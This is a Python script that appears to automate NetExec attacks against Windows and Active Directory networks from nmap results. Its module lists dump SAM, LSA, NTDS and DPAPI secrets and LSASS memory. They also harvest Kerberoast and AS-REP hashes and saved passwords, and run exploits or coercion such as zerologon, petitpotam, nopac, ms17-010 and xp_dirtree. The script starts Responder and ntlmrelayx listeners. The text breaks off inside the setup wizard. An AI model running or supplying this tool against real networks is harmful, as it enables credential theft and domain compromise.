#!/usr/bin/env python3
"""
nxc_scan.py — NetExec Auto-Scanner
Reads nmap output, extracts hosts per protocol, pre-checks credentials,
then runs netexec modules concurrently with structured JSON/CSV output.

Source: https://www.netexec.wiki/
"""

import argparse
import csv
import ipaddress
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from getpass import getpass
from pathlib import Path

# ── Colours ───────────────────────────────────────────────────────────────────
R = "\033[0;31m"; Y = "\033[1;33m"; G = "\033[0;32m"
C = "\033[0;36m"; B = "\033[1m";    RST = "\033[0m"

def banner():
    print(f"{C}{B}")
    print("  ███╗   ██╗██╗  ██╗ ██████╗ ".rstrip())
    print("  ████╗  ██║╚██╗██╔╝██╔════╝ ".rstrip())
    print("  ██╔██╗ ██║ ╚███╔╝ ██║      ".rstrip())
    print("  ██║╚██╗██║ ██╔██╗ ██║      ".rstrip())
    print("  ██║ ╚████║██╔╝ ██╗╚██████╗ ".rstrip())
    print("  ╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝  auto-scanner (Python)")
    print(f"{RST}")

def section(title):  print(f"\n{B}{Y}{'═'*54}{RST}\n{B}{Y}  {title}{RST}\n{B}{Y}{'═'*54}{RST}")
def info(msg):       print(f"{G}[*]{RST} {msg}")
def ok(msg):         print(f"{G}[+]{RST} {msg}")
def warn(msg):       print(f"{Y}[!]{RST} {msg}")
def fail(msg):       print(f"{R}[-]{RST} {msg}")

# ── Protocol → port mapping ───────────────────────────────────────────────────
PROTO_PORTS = {
    "smb":    [445, 139],
    "ldap":   [389, 636],
    "ssh":    [22],
    "ftp":    [21],
    "wmi":    [135],
    "winrm":  [5985, 5986],
    "rdp":    [3389],
    "vnc":    [5900, 5901, 5902],
    "mssql":  [1433],
    "nfs":    [2049, 111],
}

# ── Module definitions ────────────────────────────────────────────────────────
# Each entry: (label, [args...], requires_auth, admin_only)
# {LISTENER} and {OUTPUT_DIR} are substituted at runtime

SMB_MODULES_LOWPRIV = [
    ("SMB_relay_list",       ["smb", "{HOST_FILE}", "--gen-relay-list", "{OUTPUT_DIR}/relay_targets.txt"], False, False),
    ("SMB_users",            ["smb", "{HOST_FILE}", "--users"],           True,  False),
    ("SMB_groups",           ["smb", "{HOST_FILE}", "--groups"],          True,  False),
    ("SMB_local_groups",     ["smb", "{HOST_FILE}", "--local-groups"],    True,  False),
    ("SMB_shares",           ["smb", "{HOST_FILE}", "--shares"],          True,  False),
    ("SMB_sessions",         ["smb", "{HOST_FILE}", "--sessions"],        True,  False),
    ("SMB_loggedon",         ["smb", "{HOST_FILE}", "--loggedon-users"],  True,  False),
    ("SMB_pass_pol",         ["smb", "{HOST_FILE}", "--pass-pol"],        True,  False),
    ("SMB_rid_brute",        ["smb", "{HOST_FILE}", "--rid-brute"],       True,  False),
    ("SMB_interfaces",       ["smb", "{HOST_FILE}", "--interfaces"],      True,  False),
    ("SMB_disks",            ["smb", "{HOST_FILE}", "--disks"],           True,  False),
    ("SMB_M_spider_plus",    ["smb", "{HOST_FILE}", "-M", "spider_plus"], True,  False),
    ("SMB_M_enum_av",        ["smb", "{HOST_FILE}", "-M", "enum_av"],     True,  False),
    ("SMB_M_webdav",         ["smb", "{HOST_FILE}", "-M", "webdav"],      True,  False),
    ("SMB_M_spooler",        ["smb", "{HOST_FILE}", "-M", "spooler"],     True,  False),
    ("SMB_M_ioxidresolver",  ["smb", "{HOST_FILE}", "-M", "ioxidresolver"], True, False),
    ("SMB_M_gpp_password",   ["smb", "{HOST_FILE}", "-M", "gpp_password"], True, False),
    ("SMB_M_gpp_autologin",  ["smb", "{HOST_FILE}", "-M", "gpp_autologin"], True, False),
]

SMB_VULN_MODULES = [
    ("SMB_M_zerologon",      ["smb", "{HOST_FILE}", "-M", "zerologon"],   True,  False),
    ("SMB_M_petitpotam",     ["smb", "{HOST_FILE}", "-M", "petitpotam"],  True,  False),
    ("SMB_M_nopac",          ["smb", "{HOST_FILE}", "-M", "nopac"],       True,  False),
    ("SMB_M_ms17_010",       ["smb", "{HOST_FILE}", "-M", "ms17-010"],    True,  False),
    ("SMB_M_smbghost",       ["smb", "{HOST_FILE}", "-M", "smbghost"],    True,  False),
    ("SMB_M_ntlm_reflect",   ["smb", "{HOST_FILE}", "-M", "ntlm_reflection"], True, False),
    # coerce_plus check-only (no listener, safe)
    ("SMB_M_coerce_check",   ["smb", "{HOST_FILE}", "-M", "coerce_plus"], True,  False),
    # coerce_plus active (with listener IP, ALWAYS=true)
    ("SMB_M_coerce_active",  ["smb", "{HOST_FILE}", "-M", "coerce_plus", "-o",
                               "LISTENER={LISTENER}", "ALWAYS=true"],     True,  False),
]

SMB_ADMIN_MODULES = [
    ("SMB_sam",               ["smb", "{HOST_FILE}", "--sam"],            True, True),
    ("SMB_lsa",               ["smb", "{HOST_FILE}", "--lsa"],            True, True),
    ("SMB_ntds",              ["smb", "{HOST_FILE}", "--ntds"],           True, True),
    ("SMB_dpapi",             ["smb", "{HOST_FILE}", "--dpapi"],          True, True),
    ("SMB_M_lsassy",          ["smb", "{HOST_FILE}", "-M", "lsassy"],     True, True),
    ("SMB_M_nanodump",        ["smb", "{HOST_FILE}", "-M", "nanodump"],   True, True),
    ("SMB_M_ntdsutil",        ["smb", "{HOST_FILE}", "-M", "ntdsutil"],   True, True),
    ("SMB_M_msol",            ["smb", "{HOST_FILE}", "-M", "msol"],       True, True),
    ("SMB_M_veeam",           ["smb", "{HOST_FILE}", "-M", "veeam"],      True, True),
    ("SMB_M_keepass",         ["smb", "{HOST_FILE}", "-M", "keepass_discover"], True, True),
    ("SMB_M_putty",           ["smb", "{HOST_FILE}", "-M", "putty"],      True, True),
    ("SMB_M_winscp",          ["smb", "{HOST_FILE}", "-M", "winscp"],     True, True),
    ("SMB_M_wifi",            ["smb", "{HOST_FILE}", "-M", "wifi"],       True, True),
    ("SMB_M_impersonate",     ["smb", "{HOST_FILE}", "-M", "impersonate"], True, True),
    ("SMB_M_teams",           ["smb", "{HOST_FILE}", "-M", "teams_localdb"], True, True),
]

LDAP_MODULES = [
    ("LDAP_users",                 ["ldap", "{HOST_FILE}", "--users"],                          True, False),
    ("LDAP_groups",                ["ldap", "{HOST_FILE}", "--groups"],                         True, False),
    ("LDAP_password_not_required", ["ldap", "{HOST_FILE}", "--password-not-required"],          True, False),
    ("LDAP_admin_count",           ["ldap", "{HOST_FILE}", "--admin-count"],                    True, False),
    ("LDAP_user_descriptions",     ["ldap", "{HOST_FILE}", "--user-descriptions"],              True, False),
    ("LDAP_trusted_delegation",    ["ldap", "{HOST_FILE}", "--trusted-for-delegation"],         True, False),
    ("LDAP_find_delegation",       ["ldap", "{HOST_FILE}", "--find-delegation"],                True, False),
    ("LDAP_asreproast",            ["ldap", "{HOST_FILE}", "--asreproast",
                                    "{OUTPUT_DIR}/asreproast_hashes.txt"],                      True, False),
    ("LDAP_kerberoast",            ["ldap", "{HOST_FILE}", "--kerberoast",
                                    "{OUTPUT_DIR}/kerberoast_hashes.txt"],                      True, False),
    ("LDAP_bloodhound",            ["ldap", "{HOST_FILE}", "--bloodhound", "-c", "All"],        True, False),
    ("LDAP_gmsa",                  ["ldap", "{HOST_FILE}", "--gmsa"],                           True, False),
    ("LDAP_domain_sid",            ["ldap", "{HOST_FILE}", "--get-sid"],                        True, False),
    ("LDAP_M_adcs",                ["ldap", "{HOST_FILE}", "-M", "adcs"],                       True, False),
    ("LDAP_M_laps",                ["ldap", "{HOST_FILE}", "-M", "laps"],                       True, False),
    ("LDAP_M_ldap_checker",        ["ldap", "{HOST_FILE}", "-M", "ldap-checker"],               True, False),
    ("LDAP_M_maq",                 ["ldap", "{HOST_FILE}", "-M", "maq"],                        True, False),
    ("LDAP_M_pre2k",               ["ldap", "{HOST_FILE}", "-M", "pre2k"],                      True, False),
    ("LDAP_M_enum_trusts",         ["ldap", "{HOST_FILE}", "-M", "enum_trusts"],                True, False),
    ("LDAP_M_sccm",                ["ldap", "{HOST_FILE}", "-M", "sccm"],                       True, False),
    ("LDAP_M_pso",                 ["ldap", "{HOST_FILE}", "-M", "pso"],                        True, False),
]

MSSQL_MODULES = [
    ("MSSQL_auth",           ["mssql", "{HOST_FILE}"],                                          True, False),
    ("MSSQL_rid_brute",      ["mssql", "{HOST_FILE}", "--rid-brute"],                           True, False),
    ("MSSQL_databases",      ["mssql", "{HOST_FILE}", "-q",
                               "SELECT name FROM master.dbo.sysdatabases;"],                    True, False),
    ("MSSQL_linked",         ["mssql", "{HOST_FILE}", "-q",
                               "SELECT name FROM sys.servers;"],                                True, False),
    ("MSSQL_M_priv",         ["mssql", "{HOST_FILE}", "-M", "mssql_priv"],                      True, False),
    # coerce via xp_dirtree
    ("MSSQL_coerce_xpdirtree", ["mssql", "{HOST_FILE}", "-q",
                                 "EXEC xp_dirtree '\\\\{LISTENER}\\share';"],                  True, False),
]

WINRM_MODULES_LOWPRIV = [
    ("WinRM_auth",  ["winrm", "{HOST_FILE}"], True, False),
]
WINRM_ADMIN_MODULES = [
    ("WinRM_sam",   ["winrm", "{HOST_FILE}", "--sam"], True, True),
    ("WinRM_lsa",   ["winrm", "{HOST_FILE}", "--lsa"], True, True),
]

OTHER_PROTO_MODULES = {
    "ssh":   [("SSH_auth",        ["ssh",   "{HOST_FILE}"],                         True, False)],
    "rdp":   [("RDP_auth",        ["rdp",   "{HOST_FILE}"],                         True, False),
              ("RDP_screenshot",  ["rdp",   "{HOST_FILE}", "--screenshot"],          True, False),
              ("RDP_nla",         ["rdp",   "{HOST_FILE}", "--nla-screenshot"],      True, False)],
    "ftp":   [("FTP_auth",        ["ftp",   "{HOST_FILE}"],                         True, False),
              ("FTP_ls",          ["ftp",   "{HOST_FILE}", "--ls"],                  True, False),
              ("FTP_anon",        ["ftp",   "{HOST_FILE}", "--ls"],                  False, False)],  # anon handled specially
    "wmi":   [("WMI_auth",        ["wmi",   "{HOST_FILE}"],                         True, False)],
    "vnc":   [("VNC_auth",        ["vnc",   "{HOST_FILE}"],                         True, False)],
    "nfs":   [("NFS_enum",        ["nfs",   "{HOST_FILE}"],                         True, False)],
}


# ── IP detection ──────────────────────────────────────────────────────────────
def detect_local_ip() -> str:
    for iface in ["tun0", "tun1", "eth0", "ens33", "ens3", "enp0s3"]:
        try:
            out = subprocess.check_output(
                ["ip", "-4", "addr", "show", iface],
                stderr=subprocess.DEVNULL, text=True
            )
            m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", out)
            if m:
                return m.group(1)
        except subprocess.CalledProcessError:
            continue
    try:
        out = subprocess.check_output(
            ["ip", "-4", "route", "get", "8.8.8.8"],
            stderr=subprocess.DEVNULL, text=True
        )
        m = re.search(r"src\s+(\d+\.\d+\.\d+\.\d+)", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    return "127.0.0.1"


# ── nmap parser ───────────────────────────────────────────────────────────────
def parse_nmap_dir(nmap_dir: Path) -> dict[str, list[str]]:
    """
    Returns {proto: [host, host, ...]} based on open ports in nmap -oN files.

    Host identity = the filename (e.g. '10.252.90.4' or 'dc01.corp.local').
    This is always clean because nmap_scan.sh names files directly from scope.txt.
    Parsing the report header for the host is unreliable because:
      - 'dc01.corp.local (10.252.90.5)' → rstrip(')') breaks the IP regex
      - the bracketed IP gets passed to nxc as a malformed string
    """
    proto_hosts: dict[str, list[str]] = {p: [] for p in PROTO_PORTS}
    skipped = []
    parsed = []

    for nmap_file in sorted(nmap_dir.iterdir()):
        if not nmap_file.is_file():
            continue

        text = nmap_file.read_text(errors="replace")

        # Skip any non-nmap files in the folder (reports, lock files, etc.)
        if "Nmap scan report for" not in text:
            skipped.append(nmap_file.name)
            continue

        # Filename IS the host — exactly as written in scope.txt
        host = nmap_file.name
        parsed.append(host)

        for proto, ports in PROTO_PORTS.items():
            for port in ports:
                # Allow optional leading whitespace — some nmap versions indent
                if re.search(rf"^\s*{port}/tcp\s+open", text, re.MULTILINE):
                    if host not in proto_hosts[proto]:
                        proto_hosts[proto].append(host)
                    break  # one matching port is enough for this protocol

    info(f"Parsed {len(parsed)} nmap file(s), skipped {len(skipped)} non-nmap file(s)")
    if skipped:
        for s in skipped:
            warn(f"  Skipped: {s}")

    return {p: h for p, h in proto_hosts.items() if h}


# ── Host file writer ──────────────────────────────────────────────────────────
def write_host_files(proto_hosts: dict, output_dir: Path) -> dict[str, Path]:
    host_files = {}
    for proto, hosts in proto_hosts.items():
        p = output_dir / f"open_{proto}_ports_all_hosts.txt"
        p.write_text("\n".join(hosts) + "\n")
        host_files[proto] = p
    return host_files


# ── Argument substitution ─────────────────────────────────────────────────────
def build_cmd(nxc_bin: str, args: list[str], host_file: Path,
              output_dir: Path, listener_ip: str) -> list[str]:
    result = [nxc_bin]
    for a in args:
        a = a.replace("{HOST_FILE}", str(host_file))
        a = a.replace("{OUTPUT_DIR}", str(output_dir))
        a = a.replace("{LISTENER}", listener_ip)
        result.append(a)
    return result


# ── Auth flags ────────────────────────────────────────────────────────────────
def _kcache_flag(nxc_bin: str) -> str:
    """Return whichever ccache flag this nxc build accepts."""
    try:
        out = subprocess.run(
            [nxc_bin, "smb", "--help"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL, text=True, timeout=5
        ).stdout
        if "--use-kcache" in out:
            return "--use-kcache"
    except Exception:
        pass
    return "--use-ccache"


def auth_args(cfg: dict) -> list[str]:
    """
    Build the full authentication argument list exactly as nxc expects it.
    Working reference:
      nxc ldap <host> -u 'user' -d domain -k --use-kcache
      nxc smb  <host> -u 'user' -p 'pass' -d domain
      nxc smb  <host> -u 'user' -H 'hash' -d domain
    """
    mode = cfg["auth_mode"]
    args = []

    # Username always comes first
    if cfg.get("username"):
        args += ["-u", cfg["username"]]

    if mode == "kcache":
        # -d domain, then -k, then --use-kcache  (matches working CLI order)
        if cfg.get("domain"):
            args += ["-d", cfg["domain"]]
        if cfg.get("kdc_ip"):
            args += ["--kdcHost", cfg["kdc_ip"]]
        args += ["-k", cfg.get("kcache_flag", "--use-kcache")]

    elif mode == "hash":
        args += ["-H", cfg["hash"]]
        if cfg.get("domain"):
            args += ["-d", cfg["domain"]]
        if cfg.get("kdc_ip"):
            args += ["--kdcHost", cfg["kdc_ip"]]

    else:  # password
        args += ["-p", cfg["password"]]
        if cfg.get("domain"):
            args += ["-d", cfg["domain"]]
        if cfg.get("kdc_ip"):
            args += ["--kdcHost", cfg["kdc_ip"]]

    if cfg.get("local_auth"):
        args += ["--local-auth"]

    return args


def domain_args(cfg: dict) -> list[str]:
    """
    domain_args is now a no-op — all flags are built inside auth_args
    to guarantee correct argument order. Kept for compatibility.
    """
    return []


# ── Runner ────────────────────────────────────────────────────────────────────
_print_lock = threading.Lock()

class ModuleResult:
    def __init__(self, label: str, proto: str, cmd: list[str]):
        self.label = label
        self.proto = proto
        self.cmd = cmd
        self.stdout = ""
        self.returncode = -1
        self.success = False   # True if nxc reported [+]
        self.pwned = False
        self.started_at = ""
        self.finished_at = ""
        self.duration_s = 0.0

MODULE_TIMEOUT = 120   # seconds per module before hard kill

def run_module(nxc_bin: str, label: str, proto: str,
               base_cmd: list[str], auth: list[str], domain: list[str],
               output_dir: Path, no_auth: bool = False) -> ModuleResult:
    """Run a single nxc module, return structured result."""
    cmd = base_cmd + ([] if no_auth else auth + domain)
    result = ModuleResult(label, proto, cmd)
    result.started_at = datetime.now().isoformat()

    with _print_lock:
        print(f"\n{C}  [>]{RST} {' '.join(cmd)}")

    t0 = datetime.now()
    try:
        proc = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,   # prevent any accidental stdin reads / hangs
            text=True,
            timeout=MODULE_TIMEOUT,
        )
        result.stdout = proc.stdout + proc.stderr
        result.returncode = proc.returncode
    except subprocess.TimeoutExpired:
        result.stdout = f"[TIMEOUT — module exceeded {MODULE_TIMEOUT}s and was killed]"
        result.returncode = -1
    except Exception as e:
        result.stdout = f"[ERROR: {e}]"
        result.returncode = -1

    t1 = datetime.now()
    result.finished_at = t1.isoformat()
    result.duration_s = round((t1 - t0).total_seconds(), 2)
    result.success = bool(re.search(r"\[\+\]", result.stdout))
    result.pwned   = "Pwn3d!" in result.stdout

    out_file = output_dir / f"Module_{label}.txt"
    out_file.write_text(result.stdout)

    if result.returncode == -1 and "TIMEOUT" in result.stdout:
        status = f"{Y}⏱ TIMEOUT{RST}"
    elif result.pwned:
        status = f"{R}★ PWNED{RST}"
    elif result.success:
        status = f"{G}✓ success{RST}"
    else:
        status = f"{Y}· ran{RST}"

    with _print_lock:
        print(f"  {B}↳{RST} {out_file.name}  [{result.duration_s}s]  {status}")

    return result


def run_concurrent(jobs: list[tuple], cfg: dict, output_dir: Path,
                   max_workers: int = 6) -> list[ModuleResult]:
    """
    jobs: list of (label, proto, base_cmd_list, no_auth_bool)
    Submits all jobs to the thread pool and prints a live progress counter
    so the terminal never looks stuck.
    """
    nxc_bin = cfg["nxc_bin"]
    auth    = auth_args(cfg)
    domain  = domain_args(cfg)
    results = []
    total   = len(jobs)
    done    = 0

    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        futures = {
            pool.submit(run_module, nxc_bin, label, proto, cmd,
                        auth, domain, output_dir, no_auth): label
            for label, proto, cmd, no_auth in jobs
        }

        for future in as_completed(futures):
            done += 1
            label = futures[future]
            try:
                r = future.result()
                results.append(r)
            except Exception as e:
                warn(f"Module {label} raised an exception: {e}")

            # Live progress line — always visible even if modules are slow
            with _print_lock:
                pct = int((done / total) * 100)
                bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
                print(f"\r  {C}Progress:{RST} [{bar}] {done}/{total} ({pct}%)   ",
                      end="", flush=True)

        print()  # newline after progress bar

    return results


# ── Credential test (single proto, single host) ───────────────────────────────
def _test_creds(cfg: dict, proto: str, host: str) -> bool:
    """Run a quick nxc auth check. Returns True on [+] or Pwn3d!"""
    cmd = [cfg["nxc_bin"], proto, host] + auth_args(cfg) + domain_args(cfg)
    try:
        out = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,
            text=True,
            timeout=30,
        ).stdout
        return bool(re.search(r"\[\+\]", out)) or "Pwn3d!" in out
    except Exception:
        return False


# ── Re-enter credentials interactively ───────────────────────────────────────
def _collect_auth_interactive(cfg: dict) -> dict:
    """Ask for new credentials and return updated cfg. Does not mutate original."""
    c = dict(cfg)
    print(f"\n{B}Choose a different authentication method:{RST}")
    print("  1) Password")
    print("  2) NTLM Hash  (Pass-the-Hash)")
    print("  3) Kerberos ccache  (--use-kcache / --use-ccache)")
    print("  4) Generate TGT from password")
    print("  q) Quit")
    choice = input(f"{B}Choice [1-4/q]:{RST} ").strip().lower()

    if choice == "q":
        print("Aborted."); sys.exit(0)

    elif choice == "1":
        c["auth_mode"] = "password"
        c["username"]  = input(f"{B}Username:{RST} ").strip()
        c["password"]  = getpass(f"{B}Password:{RST} ")

    elif choice == "2":
        c["auth_mode"] = "hash"
        c["username"]  = input(f"{B}Username:{RST} ").strip()
        c["hash"]      = input(f"{B}NTLM Hash (LM:NT or NT):{RST} ").strip()

    elif choice == "3":
        c["auth_mode"]    = "kcache"
        c["username"]     = input(f"{B}Username (display only):{RST} ").strip()
        c["kcache_flag"]  = cfg.get("kcache_flag", "--use-kcache")

        existing = os.environ.get("KRB5CCNAME", "")
        if existing:
            info(f"KRB5CCNAME currently set to: {existing}")
            keep = input(f"{B}Use this ccache? [Y/n]:{RST} ").strip().lower()
            if keep == "n":
                existing = ""

        if not existing:
            while True:
                cc = input(f"{B}Path to .ccache file:{RST} ").strip()
                if Path(cc).exists():
                    os.environ["KRB5CCNAME"] = cc
                    ok(f"KRB5CCNAME set to {cc}")
                    break
                else:
                    fail(f"File not found: {cc}")
                    retry = input(f"{B}Try again? [Y/n]:{RST} ").strip().lower()
                    if retry == "n":
                        print("Aborted."); sys.exit(0)

    elif choice == "4":
        c["auth_mode"] = "password"
        c["username"]  = input(f"{B}Username:{RST} ").strip()
        c["password"]  = getpass(f"{B}Password:{RST} ")
        tgt_dc = c.get("kdc_ip") or input(f"{B}DC IP for TGT request:{RST} ").strip()
        Path(c["output_dir"]).mkdir(parents=True, exist_ok=True)
        tgt_file = str(Path(c["output_dir"]) / f"{c['username']}.ccache")
        info(f"Requesting TGT from {tgt_dc} → {tgt_file}")
        subprocess.run(
            [c["nxc_bin"], "smb", tgt_dc,
             "-u", c["username"], "-p", c["password"], "--gen-tgt", tgt_file],
            check=False
        )
        if Path(tgt_file).exists():
            os.environ["KRB5CCNAME"] = tgt_file
            c["auth_mode"]   = "kcache"
            c["kcache_flag"] = cfg.get("kcache_flag", "--use-kcache")
            ok(f"TGT saved. KRB5CCNAME={tgt_file}")
        else:
            warn("TGT generation failed — falling back to password auth.")

    else:
        warn("Invalid choice — keeping current credentials.")

    return c


# ── Pre-auth check with retry loop ───────────────────────────────────────────
def precheck(cfg: dict, proto_hosts: dict, host_files: dict) -> tuple[dict, dict[str, bool]]:
    """
    Test credentials against one host per discovered protocol.
    If any protocol fails, offers the user a chance to re-enter creds and retry.
    Returns (possibly updated cfg, {proto: bool} status map).
    """
    section("STAGE 2 — Pre-auth credential check")

    # Pick the best test protocol — SMB first as it's most reliable
    test_order = ["smb", "ldap", "winrm", "mssql", "ssh", "ftp", "rdp", "wmi", "vnc"]

    while True:
        # ── Run one quick test per available protocol ─────────────────────────
        status: dict[str, bool] = {}
        for proto in test_order:
            if proto not in proto_hosts:
                continue
            test_host = proto_hosts[proto][0]
            info(f"[{proto}] Testing credentials against {test_host} ...")
            result = _test_creds(cfg, proto, test_host)
            if result:
                ok(f"[{proto}] {G}{B}SUCCESS{RST} on {test_host}")
            else:
                fail(f"[{proto}] FAILED on {test_host}")
            status[proto] = result

        # ── Summary table ─────────────────────────────────────────────────────
        any_ok   = any(status.values())
        any_fail = not all(status.values())

        print(f"\n  {B}Pre-auth summary:{RST}")
        print(f"  {'Protocol':<12} {'Host':<20} Status")
        print(f"  {'────────':<12} {'────':<20} ──────")
        for proto in sorted(status):
            host = proto_hosts[proto][0]
            if status[proto]:
                print(f"  {G}{proto:<12} {host:<20} ✓ Success{RST}")
            else:
                print(f"  {R}{proto:<12} {host:<20} ✗ Failed{RST}")

        # ── Decision ──────────────────────────────────────────────────────────
        if any_ok and not any_fail:
            # All protocols authenticated — proceed
            print("")
            ok("All credential checks passed.")
            break

        print("")
        if any_ok:
            warn("Some protocols failed authentication.")
        else:
            warn("All credential checks failed.")

        print(f"\n{B}What would you like to do?{RST}")
        print("  1) Continue anyway  (failed modules will produce no output)")
        print("  2) Re-enter credentials and retry")
        print("  3) Quit")
        action = input(f"{B}Choice [1-3]:{RST} ").strip()

        if action == "1":
            break
        elif action == "2":
            cfg = _collect_auth_interactive(cfg)
            info("Retrying credential checks with new auth...")
            continue
        else:
            print("Aborted."); sys.exit(0)

    return cfg, status


# ── Listener management ───────────────────────────────────────────────────────
class Listener:
    def __init__(self):
        self.proc: subprocess.Popen | None = None
        self.log_path: Path | None = None

    def start_responder(self, iface: str, output_dir: Path):
        self.log_path = output_dir / "listener_responder.txt"
        with open(self.log_path, "w") as f:
            self.proc = subprocess.Popen(
                ["responder", "-I", iface, "-wv"],
                stdout=f, stderr=f
            )
        ok(f"Responder started (PID {self.proc.pid}) → {self.log_path}")

    def start_ntlmrelayx(self, relay_target: str, output_dir: Path):
        self.log_path = output_dir / "listener_ntlmrelayx.txt"
        relay_bin = shutil.which("ntlmrelayx.py") or shutil.which("impacket-ntlmrelayx")
        if not relay_bin:
            warn("ntlmrelayx not found, skipping."); return
        with open(self.log_path, "w") as f:
            self.proc = subprocess.Popen(
                [relay_bin, "-t", relay_target, "-smb2support"],
                stdout=f, stderr=f
            )
        ok(f"ntlmrelayx started (PID {self.proc.pid}) → {self.log_path}")

    def stop(self):
        if self.proc and self.proc.poll() is None:
            warn(f"Stopping listener (PID {self.proc.pid})...")
            self.proc.terminate()


# ── Reporting ─────────────────────────────────────────────────────────────────
def write_reports(results: list[ModuleResult], output_dir: Path,
                  cfg: dict, proto_hosts: dict):
    ts = datetime.now().isoformat()

    # ── JSON ──────────────────────────────────
    report = {
        "scan_metadata": {
            "timestamp":   ts,
            "nxc_bin":     cfg["nxc_bin"],
            "username":    cfg.get("username", ""),
            "domain":      cfg.get("domain", ""),
            "local_auth":  cfg.get("local_auth", False),
            "auth_mode":   cfg["auth_mode"],
            "smb_mode":    cfg.get("smb_mode", "lowpriv"),
            "listener_ip": cfg.get("listener_ip", ""),
            "nmap_dir":    cfg.get("nmap_dir", ""),
        },
        "hosts_discovered": {
            proto: hosts for proto, hosts in proto_hosts.items()
        },
        "modules": [
            {
                "label":       r.label,
                "protocol":    r.proto,
                "command":     " ".join(r.cmd),
                "returncode":  r.returncode,
                "success":     r.success,
                "pwned":       r.pwned,
                "duration_s":  r.duration_s,
                "started_at":  r.started_at,
                "finished_at": r.finished_at,
                "output_file": f"Module_{r.label}.txt",
            }
            for r in results
        ],
        "summary": {
            "total_modules":   len(results),
            "succeeded":       sum(1 for r in results if r.success),
            "pwned_hosts":     sum(1 for r in results if r.pwned),
            "total_duration_s": sum(r.duration_s for r in results),
        },
    }

    json_path = output_dir / "scan_report.json"
    json_path.write_text(json.dumps(report, indent=2))
    ok(f"JSON report → {json_path}")

    # ── CSV ───────────────────────────────────
    csv_path = output_dir / "scan_report.csv"
    with open(csv_path, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=[
            "label", "protocol", "returncode", "success",
            "pwned", "duration_s", "started_at", "finished_at", "command"
        ])
        writer.writeheader()
        for r in results:
            writer.writerow({
                "label":       r.label,
                "protocol":    r.proto,
                "returncode":  r.returncode,
                "success":     r.success,
                "pwned":       r.pwned,
                "duration_s":  r.duration_s,
                "started_at":  r.started_at,
                "finished_at": r.finished_at,
                "command":     " ".join(r.cmd),
            })
    ok(f"CSV report  → {csv_path}")

    # ── Summary to stdout ─────────────────────
    s = report["summary"]
    section("Scan Summary")
    info(f"Total modules run : {s['total_modules']}")
    info(f"Succeeded (auth)  : {s['succeeded']}")
    if s["pwned_hosts"]:
        ok(f"{R}★ PWNED on       : {s['pwned_hosts']} module(s){RST}")
    info(f"Total wall time   : {s['total_duration_s']:.1f}s")

    # Highlight pwned / successes
    pwned = [r for r in results if r.pwned]
    if pwned:
        section("★ Pwned Hosts")
        for r in pwned:
            print(f"  {R}★{RST} {r.label}")


# ── Wizard ────────────────────────────────────────────────────────────────────
def wizard(args) -> dict:
    cfg = {}

    cfg["nxc_bin"] = shutil.which("nxc") or shutil.which("netexec")
    if not cfg["nxc_bin"]:
        print(f"{R}[!] nxc / netexec not found in PATH. Aborting.{RST}"); sys.exit(1)

    # nmap dir
    nmap_dir = args.nmap_dir or input(f"{B}Nmap results directory{RST} [default: nmap]: ").strip() or "nmap"
    cfg["nmap_dir"] = nmap_dir
    if not Path(nmap_dir).is_dir():
        print(f"{R}[!] '{nmap_dir}' not found.{RST}"); sys.exit(1)

    # output dir
    cfg["output_dir"] = args.output_dir or "netexecscan"

    # domain
    cfg["domain"] = args.domain or input(f"{B}Domain (e.g. corp.local) — blank if not AD:{RST} ").strip()

    # KDC
    cfg["kdc_ip"] = ""
    if cfg["domain"]:
        cfg["kdc_ip"] = args.kdc or input(f"{B}DC/KDC IP (for Kerberos, blank to skip):{RST} ").strip()

    # auth mode
    if args.username and args.password:
        cfg["auth_mode"] = "password"
        cfg["username"]  = args.username
        cfg["password"]  = args.password
    elif args.username and args.hash:
        cfg["auth_mode"] = "hash"
        cfg["username"]  = args.username
        cfg["hash"]      = args.hash
    elif args.use_kcache:
        cfg["auth_mode"]   = "kcache"
        cfg["kcache_flag"] = _kcache_flag(cfg["nxc_bin"])
        cfg["username"]    = args.username or ""
        # Validate KRB5CCNAME is set and the file exists
        cc = os.environ.get("KRB5CCNAME", "")
        if not cc:
            fail("KRB5CCNAME is not set. Please export KRB5CCNAME=/path/to/file.ccache")
            sys.exit(1)
        if not Path(cc).exists():
            fail(f"ccache file not found: {cc}")
            sys.exit(1)
        ok(f"Using ccache: {cc}  (flag: {cfg['kcache_flag']})")
    else:
        print(f"\n{B}Authentication mode:{RST}")
        print("  1) Password  2) NTLM Hash  3) Kerberos ccache  4) Generate TGT")
        choice = input(f"{B}Choice [1-4]:{RST} ").strip()

        if choice == "2":
            cfg["auth_mode"] = "hash"
            cfg["username"]  = input(f"{B}Username:{RST} ").strip()
            cfg["hash"]      = input(f"{B}NTLM Hash:{RST} ").strip()
        elif choice == "3":
            cfg["auth_mode"]   = "kcache"
            cfg["kcache_flag"] = _kcache_flag(cfg["nxc_bin"])
            cfg["username"]    = input(f"{B}Username (display only):{RST} ").strip()

            existing = os.environ.get("KRB5CCNAME", "")
            if existing:
                info(f"KRB5CCNAME already set: {existing}")
                keep = input(f"{B}Use this ccache? [Y/n]:{RST} ").strip().lower()
                if keep == "n":
                    existing = ""

            if not existing:
                while True:
                    cc = input(f"{B}Path to .ccache file:{RST} ").strip()
                    if Path(cc).exists():
                        os.environ["KRB5CCNAME"] = cc
                        ok(f"KRB5CCNAME set to {cc}")
                        break
                    else:
                        fail(f"File not found: {cc}")
                        retry = input(f"{B}Try again? [Y/n]:{RST} ").strip().lower()
                        if retry == "n":
                            print("Aborted."); sys.exit(0)
        elif choice == "4":
            cfg["auth_mode"] = "password"
            cfg["username"]  = input(f"{B}Username:{RST} ").strip()
            cfg["password"]  = getpass(f"{B}Password:{RST} ")
            tgt_dc = cfg["kdc_ip"] or input(f"{B}DC IP for TGT:{RST} ").strip()
            Path(cfg["output_dir"]).mkdir(parents=True, exist_ok=True)
